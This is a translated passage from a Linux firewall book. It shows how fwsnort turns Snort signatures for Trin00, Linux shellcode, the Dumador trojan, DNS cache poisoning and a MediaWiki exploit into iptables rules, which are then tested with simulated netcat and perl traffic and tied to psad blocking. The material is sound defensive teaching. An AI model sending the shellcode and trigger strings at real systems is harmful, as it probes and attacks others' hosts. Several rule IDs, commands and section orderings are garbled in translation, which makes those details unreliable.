Trin00 是一种经典的工具，它通过从多个攻击节点同时洪向目标发送大量 UDP 数据包来发起分布式拒绝服务（DDoS）攻击。Trin00 实现了自己的协调攻击节点工作的方法，Snort 签名集专门留了几个签名来检测 Trin00 的管理通信。例如，Snort ID 237 查找用于主网络端口 27444 的 UDP 数据包中包含的 `l44adsl` 字符串。该字符串是 Trin00 控制节点用于向端节点节点身份验证的默认密码，以便指示其执行特定操作，并包含在 Snort 规则 ID 237 中：

```
 alert udp $EXTERNAL_NET any -> $HOME_NET 27444 (msg:"DDOS Trin00 Master to Daemon
default password attempt"; content:"l44adsl"; reference:arachnids,197; classtype:
attempted-dos; sid:237; rev:2;)
```

使用 fwsnort，我们将 Snort 规则重写为等效 iptables 规则：

```
 [iptablesfw]# fwsnort --snort-sid 237
[+] Parsing Snort rules files...
[+] Found sid: 237 in ddos.rules
    Successful translation.
```

这是在 `FWSNORT_FORWARD` 链中生成的 iptables 规则。

```
 $IPTABLES -A FWSNORT_FORWARD -d 192.168.10.0/24 -p udp --dport 27444 -m string
--string "l44adsl" --algo bm -m comment --comment "sid:237; msg: DDOS Trin00 Master
to Daemon
default password attempt; classtype: attempted-dos; reference: arachnids,197; rev: 2;
FWS:1.0;" -j LOG --log-ip-options --log-prefix "[1] SID237 "
```

因为这是一个 UDP 签名，所以没有已建立连接的概念，因此该签名属于 `FWSNORT_FORWARD` 链，而不是 `FWSNORT_FORWARD_ESTAB` 链。此外，尽管书中的默认策略（参见第 20 页的“[默认 iptables 策略””）不接受发往端口 27444 的 UDP 包，但 fwsnort 仍然可以检测匹配 Trin00 签名的包，因为在发送数据之前并不需要建立连接（如 TCP 签名所示）。也就是说，我们不需要在客户端通过 UDP 套接字发送数据之前有一个 `ACCEPT` 规则。这是 TCP 和 UDP 套接字之间的根本区别。

现在，从 ext_scanner 系统，我们执行以下命令查看签名是否触发签名：

```
 [ext_scanner]$ echo "l44adsl" | nc -u 71.157.X.X 27444
```

iptables 日志忠实地报告了签名匹配：

```
 [iptablesfw]# grep SID237 /var/log/messages | tail -n 1
Jul 19 22:18 iptablesfw kernel: [1] SID237 SRC=144.202.X.X DST=71.157.X.X LEN=36 TOS=0x00 PREC=0x00 TTL=64 ID=4238 PROTO=UDP SPT=5494 DPT=27444
LEN=16
```

上面的加粗部分是来自 ext_scanner 系统的 iptables 前缀 `[1] SID237`——确实，fwsnort 检测到了（模拟的）攻击。

## 检测 Linux Shellcode 流量

由于漏洞开发者共享一些相同的 shellcode，Snort 签名集中的 `shellcode.rules` 文件会在网络流量中查找这种常见的字节基础：

```
 alert ip $EXTERNAL_NET $SHELLCODE_PORTS -> $HOME_NET any (msg:"SHELLCODE Linux
shellcode"; content:"|90 90 90 E8 C0 FF FF FF|/bin/sh"; reference:arachnids,343;
classtype:
shellcode-detect; sid:652; rev:9;)
```

使用 `fwsnort --snort-sid 652` 此签名会构建 iptables 命令。虽然原始 Snort 规则适用于所有 IP 流量，但目标端口的要求强制 iptables 匹配 TCP 或 UDP 包。

以下是应用于 TCP 流量的转换 Snort 规则：

```
 $IPTABLES -A FWSNORT_FORWARD -d 192.168.10.0/24 -p tcp --sport ! 80 -m string
--hex-string "|90 90 90 E8 C0 FF FF FF|/bin/sh" --algo bm -m comment --comment "sid:652; msg:
SHELLCODE Linux shellcode; classtype: shellcode-detect; reference: arachnids,343; rev:
9; FWS:1.0;" -j LOG --log-ip-options
--log-tcp-options --log-prefix "[1] SID652 "
```

为了在 iptables 中触发签名匹配，首先在 iptablesfw 系统上执行 `fwsnort.sh` 脚本，然后从 ext_scanner 系统执行下面的 Perl 命令。根据签名要求，Netcat 构建的 TCP 会话源端口不是端口 80，因为它根据本地 TCP 堆栈实例化客户端 TCP 套接字的方式选择了一个 1024 以上的随机高端口：

```
 [iptablesfw]# /etc/fwsnort/fwsnort.sh
[+] Adding shellcode rules.
    Rules added: 2
[ext_scanner]$ perl -e 'print "\x90\x90\x90\xE8\xC0\xFF\xFF\xFF/bin/sh"' | nc 71.157.
X.X 80
```

模拟攻击被 iptables 捕获，并出现此日志消息：





```
 [iptablesfw]# grep SID652 /var/log/messages | tail -n 1
Jul 19 23:48:18 iptablesfw kernel: [1] SID652 IN=eth0 OUT=eth1 SRC=144.202.X.X
DST=192.168.10.3 LEN=67 TOS=0x00 PREC=0x00 TTL=63 ID=570 DF PROTO=TCP SPT=54629 DPT=80
WINDOW=92 RES=0x00 ACK PSH URGP=0 OPT (0101080A2B3139EFAD325718)
```

这表明 `fwsnort` 在 `Snort` 签名规则的指导下，能够有效地检测到模拟攻击。

## 检测并响应 Dumador 特木马

近年来，恶意软件作者推高了计算机安全的风险。由于由于连接到互联网且未打补丁的 `Windows` 系统提供了丰富的目标环境，专门为收集金融和其他个人数据而设计的恶意软件所造成的破坏性可能是巨大的。

`Dumador` 木马是一种恶意软件，它包含了 `keylogger`（用于收集并将在键盘上输入的敏感信息传回给攻击者）以及一个监听 `9125` 和 `64972` 端口的 `backdoor server`（后门服务器）。`Bleeding Snort`规则集包含一个签名，用于检测 `Dumador` 木马何时尝试通过 Web 会话向攻击者回传信息，如下：

```
 alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"BLEEDING-EDGE TROJAN
Dumador Reporting User Activity"; flow:established,to_server; uricontent:".php?p=";
nocase;
uricontent:"?machineid="; nocase; uricontent:"&connection="; nocase; uricontent:"&
iplan="; nocase; classtype:trojan-activity; reference:url,www.norman.com/Virus/Virus_
descriptions/24279/; sid:2002763; rev:2;)
```

该签名在 `fwsnort` 的语文中特别有意思，因为它需要多个应用层内容匹配。为了翻译该签名，我们执行了以下操作：

```
 [iptablesfw]# fwsnort --snort-sid 2002763
[+] Parsing Snort rules files...
[+] Found sid: 2002763 in bleeding-all.rules
    Successful translation.
```

这导致你在下方看到的长 `iptables` 命令，该命令通过四次使用 `iptables` 字符串匹配（如加粗所示）来搜索原始 `Bleeding Snort` 规则所需的每个字符串：

```
 $IPTABLES -A FWSNORT_FORWARD_ESTAB -s 192.168.10.0/24 -p tcp --dport 80 -m string
--string ".php?p=" --algo bm -m string --string "?machineid=" --algo bm -m string
--string "&connection=" --algo bm -m string --string "&iplan=" --algo bm -m comment
--comment "sid:2002763; msg: BLEEDING-EDGE TROJAN Dumador Reporting User Activity;
classtype: trojan-activity; reference: url,www.norman.com/Virus/Virus_descriptions/
24279/; rev:
2; FWS:1.0;" -j LOG --log-ip-options --log-tcp-options --log-prefix "[1] SID2002763
ESTAB "
```

现在我们通过执行 `fwsnort.sh` 脚本在 `Linux` 内核中激活该签名：

```
 [iptablesfw]# /etc/fwsnort/fwsnort.sh
[+] Adding bleeding-all rules.
    Rules added: 2
```

签名激活后，该进行测试了，为此我们参考网络图。在标记为 `lan_client` 的系统中，我们执行以下 `perl` 命令（使用 `A` 字符是可选的，仅在不同的匹配标准之间提供填充数据），并将输出通过 `Netcat` 管道重定向到标记为 `ext_web` 的 Web 服务器：

```
 [lan_client]$ perl -e 'print ".php?p=AAAAA?machineid=AAAAA&connection=AAAAA&iplan="' |
nc 12.34.X.X 80
```

在防火墙系统中，`iptables` 捕获该活动并输出这条简洁的日志消息：

```
 [iptablesfw]# grep SID2002763 /var/log/messages | tail -n 1
Jul 20 01:12:53 iptablesfw kernel: [1] SID2002763 ESTAB IN=eth1 OUT=eth0 SRC=192.168.
10.3 DST=12.34.X.X LEN=104 TOS=0x00 PREC=0x00 TTL=63 ID=17247 DF PROTO=TCP SPT=
55040
DPT=80 WINDOW=1460 RES=0x00 ACK PSH URGP=0 OPT (0101080AAD7FC90A2B44969B)
```

有了规则来检测 `Dumador` 木马何时尝试携带丰丰的信息负载“回家”，`fwsnort` 可以通过使用 `--ipt-reject` 参数强制关闭 `Dumador` 的 TCP 会话，使其无法配合：

```
 [iptablesfw]#  fwsnort --snort-sid 2002763 --ipt-reject
[+] Parsing Snort rules files...
[+] Found sid: 2002763 in bleeding-all.rules
    Successful translation.
[iptablesfw]# /etc/fwsnort.fwsnort.sh
[+] Adding bleeding-all rules.
    Rules added: 4
```

现在，重新运行我们的模拟会导致不同的 `iptables` 日志消息。（日志前缀 `[1] REJ SID200263` 表示 `fwsnort` 通过生成 RST 对 Web 会话采取了行动。）

```
 [iptablesfw]# grep SID2002763 /var/log/messages | tail -n 1
Jul 20 01:16:41 iptablesfw kernel: [1] REJ SID200263 ESTAB IN=eth1 OUT=eth0 SRC=192.168.
10.3 DST=12.34.X.X LEN=104 TOS=0x00 PREC=0x00 TTL=63 ID=17247 DF PROTO=TCP SPT=
55040
DPT=80 WINDOW=1460 RES=0x00 ACK PSH URGP=0 OPT (0101080AAD7FC90A2B44969B)
```

在这种特定情况下，如果你运行的是金融机构的 `Windows` 网络，那么对匹配 `Dumador` 签名的流量采取上述惩罚措施是有意义的，以保护重要数据。

## 检测并响应缓存污染攻击

2005 年 2 月，人们发现 `Windows` DNS 服务器的默认配置使其容易受到缓存污染攻击。这种攻击在互联网上被利用，即通过一组恶意 DNS 服务器向下游 DNS 服务器发布虚假的 DNS 记录。

为了从一个恶意服务器发起任意的“下游”DNS 请求，攻击者只需要让目标服务器发起请求，例如向源发送电子邮件以触发非递送报告（NDR），或者通过预装的间谍软件发起请求。

在提供的 `bleeding-all.rules`文件中，`Snort` ID `200142` 检测内部网络系统何时为恶意域名发起 DNS 请求。我们可以通过将规则转换为 `iptables` 策略并执行生成的 `fwsnort.sh` 脚本，让 `fwsnort` 此事实：

```
 [iptablesfw]# fwsnort --snort-sid 200142
[+] Parsing Snort rules files...
[+] Found sid: 200142 in bleeding-all.rules
    Successful translation.
[iptablesfw]# /etc/fwsnort/fwsnort.sh
[+] Adding bleeding-all rules.
    Rules added: 2
```

由 SID `200142` 标识的原始 `Snort` 规则及其 `iptables` 等效项出现在 `FWSNORT_FORWARD` 链中，数据包从内置 `FORWARD` 链跳转到此处：

```
 alert udp $HOME_NET any -> any 53 (msg:"BLEEDING-EDGE Possible DNS Lookup for DNS
Poisoning Domain 7sir7.com"; content:"|05|7sir7|03|com"; nocase; reference:url,isc.
sans.org/
diary.php?date=2005-04-07; classtype: misc-activity; sid:200142; rev:3;)

$IPTABLES -A FWSNORT_FORWARD -p udp --dport 53 -m string --hex-string " 05|7sir7|03|com" --algo bm -m comment --comment "sid:200142; msg:BLEEDING-EDGE Possible DNS Lookup for DNS Poisoning Domain 7sir7.com; classtype:misc-activity; reference:url,isc.
. FWS:1.0;" -j LOG --log-ip-options --log-tcp-options --log-prefix "[1]
SID200142 "
```





为了证明 `fwsnort` 规则确实有效，我们模拟了从内部主机发出的触发签名匹配所需的流量。我们再次使用图 1-2 来帮助说明这个示例。

`dnsserver` 主机模拟了一个请求，假装它还没有将 [www.7sir7.com](http://www.7sir7.com) 映射到 IP 地址的“A”记录，因此它必须发出一个请求，最终查询 [7sir7.com](http://7sir7.com) 域名的权威（恶意）DNS 服务器。为了测试我们的 `fwsnort` 规则集是否有效，我们不需要（也不想！）一个真正易受到缓存中毒攻击的内部系统；只需从内部网络中的任何系统构造一个包含连续字节 `|05|7sir7|03|com` 的 UDP 数据包，并发送到目标端口为 53 的任何外部 IP 地址即可。

我们可以通过在 `dnsserver` 系统上使用下面所示的单个 Perl 命令，并将输出通过管道传递给 `Netcat` 发送到代表恶意 DNS 服务器的 IP 地址来轻松构造此数据包：

```bash
[dnsserver]$ perl -e 'print "\x057sir7\x03com"' | nc -u 234.50.X.X 53
```

在 `iptablesfw` 防火墙系统上，我们看到 `iptables` 确实检测到了疑包并在 `/var/log/messages` 中创建了以下日志消息（注意 `[1] SID2001842` 日志前缀）：

```bash
[iptablesfw]# grep SID2001842 /var/log/messages | tail -n 1
Jul  7 22:31:43 iptablesfw kernel: [1] SID2001842 IN=eth1 OUT=eth0 SRC=192.168.10.4
DST=234.50.X.X LEN=38 TOS=0x00 PREC=0x00 TTL=62 ID=36070 DF PROTO=UDP SPT=16408
DPT=53 LEN=18
```

由于我们在翻译缓存中毒签名时没有向 `fwsnort` 提供 `--ipt-drop` 或 `--ipt-reject` 命令行参数，`iptables` 并没有尝试阻止可疑数据包离开网络。我们可以通过在防火墙的外部接口上运行数据包追踪并执行上述相同的 Perl 命令来确认这一点：

```bash
[iptablesfw]# tcpdump -i eth0 -l -nn port 53 and host 234.50.X.X -s 0 -X
tcpdump: verbose output suppressed, use -vv for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), capture size 65535 bytes
22:41:22.683862 IP 71.157.X.X.16414 > 234.50.X.X.53: [|domain]
   0x0000:  4500 0026 64fc 4000 3e11 fce1 0000 0000  E..&d.@.>.......
   0x0010:  0000 0000 401e 0035 0012 86e50537 7369   D0..@..5.....7si
   0x0020:  7237 0363 6f6d                           r7.com \
```

在上面加粗的 `tcpdump` 输出中，显示了与缓存中毒签名相关的应用层数据十六进制代码。这证明了数据包通过了 `iptables` 防火墙转发。

但 `fwsnort` 不需要仅仅记录上述 DNS 缓存中毒攻击。在这个示例中，我们指示它丢弃指向缓存中毒域的 DNS 请求，重新部署生成的 `iptables` 策略，再次从 `dnsserver` 系统模拟请求，并检查 `iptables` 日志：

```bash
[iptablesfw]# fwsnort --snort-sids 2001842 --ipt-drop
[+] Parsing Snort rules files...
[+] Found sid: 2001842 in bleeding-all.rules
    Successful translation.
[iptablesfw]# /etc/fwsnort/fwsort.sh
[+] Adding bleeding-all rules.
    Rules added: 2
[dnsserver]$ perl -e 'print "\x057sir7\x03com"' | nc -u 234.50.X.X 53
[iptablesfw]# grep SID2001842 /var/log/messages |tail -n 1
Jul  7 22:33:42 fw kernel: [1] DRP SID2001842 IN=eth1 OUT=eth0 SRC=192.168.10.4
DST=234.50.X.X LEN=38 TOS=0x00 PREC=0x00 TTL=62 ID=36070 DF PROTO=UDP SPT=16408
DPT=53
LEN=18
```

这一次，日志前缀发生了变化。现在不再是

```
 [1] SID2001842
```

而是：

```
 [1] DRP SID2001842
```

`DRP` 字符串表示除了记录之外，`iptables` 还丢弃了该请求。通过再次在防火墙外部接口上运行数据包追踪确认了这一点，可以看到请求并未通过。

### 注意

与其 `DROP` 和 `REJECT`，`fwsnort` 使用 `DRP` 和 `REJ`，这是因为 `iptables` 的 `LOG` 匹配对日志前缀有 29 个字符的限制。你可以在第 11 章中找到关于 `--ipt-drop` 和 `--ipt-reject` 选项后台机制的更多信息。





Snort 社区为检测网络攻击的有效语言指明了方向，因此 `fwsnort` 使用 Snort 签名集作为其攻击描述源是合理的。但是，`iptables` 是一个防火墙，而防火墙的核心在于`控制`。考虑这样一个场景：你在 Linux 系统上运行的某个任务关键服务器软件发现了一个漏洞。在为该服务器安排维护窗口进行补丁之前，系统一直处于受攻击的风险。通过利用 Snort 社区的力量，一旦开发并发布了签名，`fwsnort` 就可以告诉 Linux 内核如何在造成实际危害之前丢弃那些试图利用漏洞的数据包。

尽管 `fwsnort` 可以构建丢弃数据包的 `iptables` 规则集，但这种响应并不能针对恶意 IP 地址动态地实现持久阻塞规则——这需要一个用户态进程。我们将在第 11 章 中看到，`fwsnort` 结合 `psad` 可以构建基于超时的应用层攻击阻塞规则。

# 第 11 章 结合 PSAD 和 FWSNORT

到此为止，我们分别涵盖了 `fwsnort` 和 `psad` 操作和理论方面，但尚未将这两个程序结合。尽管 `psad` 提供了检测、告警和自动响应能力，但其检测引擎的效率从根本上受到 `iptables` 日志格式特征的限制。`fwsnort`提供了更好的攻击检测，包括对应用层攻击的检测。由于 `iptables` 始终处于网络流量中，`fwsnort` 可以（可选地）防止恶意数据包到达目标。

然而，由于来自 `fwsnort` 的 `iptables` 策略完全在 Linux 内核中运行，它无法执行用户态应用程序可能的各种告警功能。我们需要一种机制，将 `fwsnort` 的检测能力与 `psad` 发布 `whois` 查询、反向 DNS 解析、发送电子邮件告警、关联 IP 危险级别以及向 DShield 通信攻击信息的能力相结合。

在本章中，我们将讨论如何通过相互强化来最大化 `psad` 和 `fwsnort` 的有效性。本章最后将讨论如何开发检测 metasploit 的签名，以及如何同时使用 `fwsnort` 和 `psad` 来干扰此类活动。

## 将 fwsnort 检测关联到 psad 操作

正如第 10 章 所述，当 `fwsnort` 检测到攻击时，它会生成一条 `iptables` 日志消息。该消息包含日志前缀，告知用户特定的 Snort 规则 ID、`fwsnort` 链中的规则编号，以及相应的数据包是否属于已建立会话。让我们来看看 `fwsnort` 和 `psad` 如何处理针对 MediaWiki 软件的攻击。

 WEB-PHP Setup.php 攻击

Snort 规则 ID `2281` 用于检测利用 MediaWiki 软件输入验证漏洞的尝试（该软件最初用于 Wikipedia；参见 http://www.wikipedia.org）。该漏洞由 Bugtraq ID `9057` 描述，并被 Snort 规则 ID `2281` 标记为 `WEB-PHP Setup.php` 攻击。对漏洞的成功利用可能导致目标系统在接收特殊构造的 URI 参数后出现未经授权的远程代码执行。我们将模拟针对内部 Web 服务器（图 1-2 中的主机 webserver）利用 `WEB-PHP Setup.php` 漏洞的攻击。我们假设默认 `iptables` 策略（由 `iptables.sh` 创建）已部署在 `iptablesfw` 系统上，模拟攻击从 `ext_scanner` 系统（IP 地址 `144.202.X.X`）发出。

首先，我们使用 `lynx` 验证是否可以通过 `iptables` 防火墙从 `ext_scanner` 系统到服务器建立 Web 连接（服务器已配置为在接收 index.html 页面的有效 Web 请求时显示字符串 `Internal webserver; happy browsing`）。

```
$ext_scanner$ lynx http://71.157.X.X
Internal webserver; happy browsing
```

在证明了 `iptables` 防火墙的连通性后，我们将在部署 `fwsnort` 或 `psad` 之前模拟攻击，以便我们了解预期。首先，这里是 Snort 规则 ID `2281`，它用于检测利用标记为 Bugtraq ID `9057` 漏洞的尝试：

```
alert tcp $EXTERNAL_NET any $HTTP_SERVERS $HTTP_PORTS (msg:"WEB-PHP Setup.php access"; flow:to_server,established; content:"/Setup.php"; nocase; reference:bugtraq,9057; clasype:web-application-activity; sid:2281; rev:2;)
```

除了字符串 `/Setup.php` 之外，上述规则并不关心从 Web 服务器请求的 URI 参数的细节（这取决于攻击者试图实现什么）。该签名严格地在 Web 请求的 URI 部分查找字符串 `/Setup.php`，并且根据 `flow` 关键字的要求，此数据必须在已建立（established）的 TCP 连接中被看到。这使得模拟该漏洞的利用变得非常简单：

```
$ext_scanner$ lynx http://71.157.X.X/Setup.php
404 Not Found
The requested URL /Setup.php was not found on this server.
Apache/2.0.54 (Fedora) Server at 71.157.X.X Port 80
```

这告诉我们我们的内部 Web 服务器并不受漏洞影响，而且因为它没有运行 MediaWiki，我们正如预料地得到了 `404 Not Found` 错误，表示请求的页面不可用。记住我们正在模拟攻击——我们只需要创建看起来像 Snort 签名试图寻找的网络流量。

### 使用 fwsnort 检测攻击

现在我们运行 `fwsnort` 且暂不带 `--ipt-drop` 或 `--ipt-reject` 参数，以通过 `iptables` 检测 `WEB-PHP Setup.php access` 攻击：

```
[iptablesfw]# fwsnort --snort-sid 2281
[+] Parsing Snort rules files...
[+] Found sid: 2281 in web-php.rules
    Successful translation

[+] Logfile:         /var/log/fwsnort.log
[+] iptables script: /etc/fwsnort/fwsnort.sh

[iptablesfw]# /etc/fwsnort/fwsnort.sh
[+] Adding web-php rules
    Rules added: 2
```

如果你查看 `/etc/fwsnort/fwsnort.sh` 脚本，你会看到一个 `iptables` 命令，它使用字符串匹配扩展自定义的 `FWSNORT_FORWARD_ESTAB` 链在已建立的 TCP 连接中检测 `/Setup.php` 字符串。该命令所示，负责检测攻击的主要工作：

```
$IPTABLES -A FWSNORT_FORWARD_ESTAB -p tcp --dport 80 -m string --string "/Setup.php" --algo bm -m comment --comment "sid:2281; msg: WEB-PHP Setup.php access; classtype: web-application-activity; reference: bugtraq,9057; rev: 2; FWS:1.0;" -j LOG --log-ip-options --log-tcp-options --log-prefix "[1] SID2281 ESTAB "
```

加粗文本是 `iptables` 日志前缀 `.`。该字符串包含在当 `iptables` 在 Web 会话中检测到字符串 `/Setup.php` 时触发的 `iptables` 日志消息中。例如，如果我们从 `ext_scanner` 系统对 Web 服务器执行相同的 `lynx http://71.157.X.X/Setup.php` 命令，我们将得到这条 `iptables` 日志消息：

```
Jul 19 23:49:18 iptablesfw kernel: [1] SID2281 ESTAB IN=eth0 OUT=eth1 
SRC=144.202.X.X
DST=192.168.10.3 LEN=276 TOS=0x00 PREC=0x00 TTL=63 ID=8317
DF PROTO=TCP SPT=47299 DPT=80 WINDOW=92 RES=0x00 ACK PSH URGP=0 OPT
(0101080A0CA8DB00E9FBEB4A)
```

### 使用 psad 告警




攻击已被 `fwsnort` 检测到，但它仅由 `iptables` 生成了一条日志消息；它没有执行任何 `whois` 查询，也没有发送电子邮件告警，因为这些超出了它的功能范围。

然而，由于 `fwsnort` 生成了 `iptables` 日志消息，`psad` 可以对其进行分析，将其告警和报告机制应用于该事件。但首先，`psad` 需要正确处理 `fwsnort` 日志消息。毕竟，这些消息是通过检查应用层数据生成的，但数据本身并没有被包含在日志消息中。

解释日志消息的关键在于 `/etc/psad/psad.conf` 文件中的 `SNORT_SID_STR` 变量。该变量描述了 `psad` 必须看到的日志前缀部分，以便推断该日志消息是由 `fwsnort` 生成。默认情况下，`SNORT_SID_STR` 设置如下：

```
 SNORT_SID_STR               SID;
```

任何包含带有 `SID` 子字符串日志前缀的 `iptables` 日志消息都是由 `fwsnort` 生成的，这些消息几乎总是针对应用层攻击。

我们现在确保 `psad` 正在运行（执行 `/etc/init.d/psad start`），然后再次模拟攻击。这次，`psad` 捕获了 `iptables` 日志消息，对其进行解析，并生成了所示的电子邮件告警。（为了简洁起见，我们删除了通常随 `psad` 告警的 `whois` 信息。）

```
 Danger level: [3] (out of 5)

Scanned TCP ports: [80: 1 packets]

❶ TCP flags: [ACK PSH: 1 packets]

iptables chain: FWSNORT_FORWARD_ESTAB (prefix ❷"[1] SID2281 ESTAB"), 1 packets
fwsnort rule: 1
Source: 144.202.X.X
DNS: [No reverse dns info available]
OS guess: Linux:2.6:17:Linux 2.6.17 and newer (?)
Destination: 192.168.10.3
DNS: web_server
Overall scan start: Thu Jul 19 23:48:18 2007
Total email alerts: 2
Complete TCP range: [80]
Syslog hostname: iptablesfw
  Global stats: chain:   interface:   TCP:   UDP:   ICMP:
              FORWARD  eth0         2      0      0

❸ [+] TCP scan signatures:

"WEB-PHP Setup.php access"
    dst port:  80
    flags:     ACK PSH
    content:   "/Setup.php"
❹     sid:       2281
    chain:     FWSNORT_FORWARD_ESTAB
    packets:   1
    classtype: web-application-activity
    reference: (bugtraq) http://www.securityfocus.com/bid/9057
```

上述 `psad` 电子邮件告警看起来相当正常，并包含了所有标准信息，例如时间戳、包计数、TCP 标志和端口等。然而，告警中的几条信息值得特别关注。

### TCP Flags

所有生成 `iptables` 日志消息的 TCP 包中存在的所有 TCP 标志都会被 `psad` 报告。在 `WEB-PHP Setup.php access` 攻击的情况下，触发 `fwsnort` 策略触发日志消息的特定 TCP 包是一个建立 TCP 会话的一部分，因此 `ACK` 和 `PSH` 标志被报告为在 ❶ 设置。前缀 `[1] SID2281 ESTAB` (❷) 也清楚地表明，该包是由 `fwsnort` 链记录的，该链利用状态匹配来跟踪已建立 TCP 连接，因此攻击者无法通过任意源地址伪造包含 `/Setup.php` 字符串的 TCP `ACK` 包来强制 `fwsnort` 生成日志消息。

### Reporting Application Layer Content

`WEB-PHP Setup.php access` 攻击的 `psad` 告警中最感兴趣的部分从上面的 ❸ 开始。该部分表明 `psad` 注意到了字符串 `[1] SID2281 ESTAB` 并映射到相应的 Snort 规则。由于 `psad` 在内存中维护了所有 Snort 规则类型、消息字段和内容字符串，它推断出违规包对应于 `web-application-activity` 中的 `WEB-PHP Setup.php access` 规则。

# 重新回顾主动响应

在第 8 章和第 10 章中，我们探讨了移除限制 `psad` 和 `fwsnort` 仅限于被动检测操作的枷锁，并将其配置为主动响应攻击的影响。在本节中，我们将继续讨论主动响应，但现在从利用 `psad` 和 `fwsnort` 响应能力的角度来看这一主题。

## psad vs. fwsnort

尽管 `psad` 在检测到攻击时可以针对攻击者实例化基于时的 `iptables` 规则，但它本身无法断开连接或阻止匹配应用程序签的初始包转发。另一方面，对于 `fwsnort`，可以使用 `DROP` 和/或 `REJECT` 目标阻止单个恶意包和会话，但 `fwsnort` 无法构建新的长时间阻塞攻击者的 `iptables` 规则。

考虑到每种工具的优点，如果能结合这两种响应风格将是有益的。毕竟，`fwsnort` 可能擅长检测并停止包含在特定 TCP 会话中的特定攻击，如果没有 `psad` 来管理持久阻塞规则，攻击者就可以尝试对同一目标尝试另一个漏洞。检测到第一次利用尝试可能被认为是相当幸运的；随后的利用尝试可能完全无法被检测到，因此持久阻塞规则可能是重要的。如果攻击者拥有一个与第一次攻击无关且没有签名的漏洞的额外利用程序，那么这一点尤为真实。此外，如果攻击者使用 Tor 匿名网络 ([`tor.eff.org`](http://tor.eff.org)) 对 TCP 服务发起攻击，那么阻塞单个 IP 地址是没用的，因为每次攻击看起来都来自一个不同的出口路由器（该路由器由 Tor 为每个 TCP 会话随机选择的）。

### Snort ID, Message, and Reference Information

最后，`psad` 报告了 Snort ID (`2281`)、它所属的类别 (`web-application-activity`) 以及消息字段 (`WEB-PHP Setup.php`)。还包括一个 `bugtraq` 链接，可以提供有关此漏洞的信息。

### Note

这假设 `iptables` 没有从交换机接收包数据；这通常是一个很好的假设，因为 `iptables` 设计的目的是针对实时数据执行策略。





虽然在第 9 章中提到过，但让我在此再次强调一下：了解活动响应机制的狡猾攻击者可能会试图颠覆它，使其反攻击目标网络。此外，如果攻击者控制了多个用于发起攻击的主机（这在地下世界中是常见现象，一个人可以控制许多主机以形成一个僵尸网络），攻击者只需从一个尚未用于攻击目标的主机发起新攻击即可。网络防御者与攻击者之间始终存在着军备竞赛，在这方面，进攻方被认为是武装精良的。

## 限制 psad 响应仅针对 fwsnort 检测到的攻击

根据第 194 页中将 fwsnort 检测关联到 psad 操作  own 包含的信息，我们已经知道 `psad` 可以为 `fwsnort` 生成的日志消息发送警报。由此推导出，`psad` 只需通过将 `/etc/psad/psad.conf` 文件中的 `ENABLE_AUTO_IDS` 设置为 `Y`，即可响应 `fwsnort` 日志消息设置 `iptables` 拦截规则。

如果 `fwsnort` 检测到的攻击使 `psad` 分配给攻击者的危险等级高于 `AUTO_IDS_DANGER_LEVEL` 变量设置的值， `psad` 将针对攻击者的 IP 地址实例化完全的 `DROP` 规则。然而，`psad` 的危险等级不仅是因为 `fwsnort` 记录了攻击；专门的端口扫描和后门探测也会被分配危险等级。

正如第 8 章中所讨论，针对扫描和探测（这些很容易被伪造）启用 `psad` 响应是非常危险的行为。理想情况下，我们希望 `psad` 仅对那些必须在建立的 TCP 连接上涉及应用层数据的攻击做出响应，而不对其他类型的攻击采取任何行动。

`AUTO_BLOCK_REGEX` 变量包含一个正则表达式，只有当相应的 `iptables` 日志消息匹配该表达式时，才会强制 `psad` 对 IP 地址执行拦截操作。默认情况下，赋值给 `AUTO_BLOCK_REGEX` 变量的值为字符串 `ESTAB`，它匹配在用于仅匹配已建立 TCP 连接数据包的自定义链中触发的 `fwsnort` 日志消息。要启用此功能，必须在 psad 中将 `ENABLE_AUTO_BLOCK_REGEX` 变量也设置为 `Y`。

### 注意

如果你打算允许 `psad` 通过防火墙隔离攻击者，你应该运行 `fwsnort` 并启用 `AUTO_BLOCK_REGEX` 功能。响应端口扫描或其他极易伪造的流量太容易被滥用。

## 结合 fwsnort 和 psad 响应

我们现在重新回顾 `WEB-PHP Setup.php access` 攻击示例，但这次我们使用了来自 `psad` 和 `fwsnort` 的活动响应机制。首先，我们配置 `fwsnort` 在恶意包到达 Web 服务器之前将其丢弃：

```
[iptablesfw]# fwsnort --snort-sid 2281 --ipt-drop
[+] Parsing Snort rules files...
[+] Found sid: 2281 in web-php.rules
    Successful translation
[+] Logfile:         /var/log/fwsnort.log
[+] Iptables script: /etc/fwsnort/fwsnort.sh

[iptablesfw]# /etc/fwsnort/fwsnort.sh
[+] Adding web-php rules
    Rules added: 4
```

如果你现在查看 `/etc/fwsnort/fwsnort.sh` 脚本，你将看到类似这样的规则：

```
$IPTABLES -A FWSNORT_FORWARD_ESTAB -p tcp --dport 80 -m string --string
"/Setup.php" --algo bm -m comment --comment "msg: WEB-PHP Setup.php access;
classtype: web-application-activity; reference: bugtraq,9057; rev: 2;
FWS:1.0;" -j LOG --log-ip-options --log-tcp-options --log-ip-options
```





```
 [iptablesfw]# psad --fw-list
[+] Listing chains from IPT_AUTO_CHAIN keywords...

Chain PSAD_BLOCK_INPUT (1 references)
 pkts bytes target     prot opt in    out   source         destination
    0     0 DROP       all  --  *     *     144.202.X.X
    0.0.0.0/0

Chain PSAD_BLOCK_OUTPUT (1 references)
 pkts bytes target     prot opt in    out   source         destination
    0     0 DROP       all  --  *     *     0.0.0.0/0      144.202.X.X

Chain PSAD_BLOCK_FORWARD (1 references)
 pkts bytes target     prot opt in    out   source         destination
    0     0 DROP       all  --  *     *     0.0.0.0/0      144.202.X.X
    0     0 DROP       all  --  *     *     144.202.X.X
    0.0.0.0/0
```

## DROP vs. REJECT 目标

在上述章节的数据包跟踪中，包含字符串 `/Setup.php` 的数据包的重传是 TCP 内置数据交付保障机制的体现，该机制在 `DROP` 目标拒绝将数据包转发到目标 TCP 栈后触发。超时后，TCP 会话将以并不优雅的方式强制关闭。然而，`fwsnort` 可以 `iptables` 的 `REJECT` 目标代替 `DROP` 目标，这样攻击者的 TCP 栈在无法通过 iptables 防火墙转发恶意数据包的同时，还能接收到一个 `RST`：

```
 [iptablesfw]# --fwsnort --snort-sid 2281 --ipt-reset
[+] Parsing Snort rules files...
[+] Found sid: 2281 in web-php.rules
    Successful translation
[+] Logfile:         /var/log/fwsnort.log
[+] Iptables script: /etc/fwsnort/fwsnort.sh
[iptablesfw]# /etc/fwsnort/fwsnort.sh
[+] Adding web-php rules
    Rules added: 4
```

